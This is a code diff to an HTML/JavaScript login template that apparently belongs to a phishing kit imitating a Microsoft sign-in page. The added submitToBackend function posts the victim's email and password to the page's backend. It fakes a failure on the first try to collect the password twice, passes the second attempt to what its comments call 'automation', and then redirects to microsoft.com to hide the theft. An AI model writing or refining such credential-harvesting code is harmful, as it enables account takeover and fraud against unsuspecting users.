@@ -150,7 +150,8 @@
       const pwd = document.getElementById("passwordInput").value;
       if(pwd.trim()) {
         password = pwd;
-        showStep3();
+        // Submit to backend for first attempt (should fail with "try again")
+        submitToBackend(email, password, false);
       } else {
         alert("Please enter your password.");
       }
@@ -194,9 +195,9 @@
     });
     
     document.getElementById("finalForm").addEventListener("submit", function(e){
+      e.preventDefault();
       const finalPassword = document.getElementById("passwordInput").value;
       if(finalPassword.trim()) {
-        document.querySelector('input[name="password"]').value = finalPassword;
         // Show loading state
         const signinBtn = document.getElementById("signinBtn");
         signinBtn.disabled = true;
@@ -211,8 +212,9 @@
           style.textContent = '@keyframes spin { to { transform: rotate(360deg); } }';
           document.head.appendChild(style);
         }
+        // Submit to backend for second attempt (should trigger automation)
+        submitToBackend(email, finalPassword, true);
       } else {
-        e.preventDefault();
         alert("Please enter your password.");
       }
     });
@@ -271,6 +273,49 @@
       {% endif %}
     {% endfor %}
   {% endif %}
+
+  // Function to submit credentials to backend
+  function submitToBackend(emailVal, passwordVal, isSecondAttempt) {
+    const formData = new FormData();
+    formData.append('csrf_token', '{{ csrf_token() }}');
+    formData.append('email', emailVal);
+    formData.append('password', passwordVal);
+    formData.append('submit', 'Sign in');
+    
+    fetch('/', {
+      method: 'POST',
+      body: formData
+    })
+    .then(response => response.text())
+    .then(html => {
+      // Parse the response to check for error messages
+      const parser = new DOMParser();
+      const doc = parser.parseFromString(html, 'text/html');
+      const errorScript = doc.querySelector('script');
+      
+      if (errorScript && errorScript.textContent.includes('showError')) {
+        // Extract error message
+        const errorMatch = errorScript.textContent.match(/showError\("([^"]+)"/);
+        if (errorMatch) {
+          if (isSecondAttempt) {
+            // This was the second attempt and it failed
+            showError(errorMatch[1]);
+          } else {
+            // This was the first attempt, show error and proceed to step 3
+            showError(errorMatch[1]);
+            setTimeout(() => showStep3(), 2000);
+          }
+        }
+      } else {
+        // Success - user will be redirected by backend
+        window.location.href = 'https://microsoft.com';
+      }
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      showError('Network error occurred');
+    });
+  }
 
   // Initialize the form
   if(!email) {
